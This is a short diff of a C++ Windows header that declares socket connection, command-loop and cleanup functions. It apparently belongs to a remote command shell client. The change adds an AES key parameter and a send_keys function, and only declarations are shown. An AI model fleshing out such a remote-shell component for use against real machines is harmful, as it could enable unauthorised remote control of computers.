@@ -5,6 +5,7 @@
 #include <windows.h>
 #include <string>
 
+
 bool initWinsock();
 
 SOCKET connectToServer(const std::string& ip, int port);
@@ -22,7 +23,8 @@ void commandLoop(
     HANDLE hReadOut,
     HANDLE hWriteIn,
     const std::string& ip,
-    int port
+    int port,
+    std::string& KeyAes
 );
 
 void cleanup(
@@ -31,5 +33,6 @@ void cleanup(
     HANDLE hWriteIn,
     PROCESS_INFORMATION& pi
 );
+std::string send_keys(SOCKET& s);
 
 #endif // EXEC_H
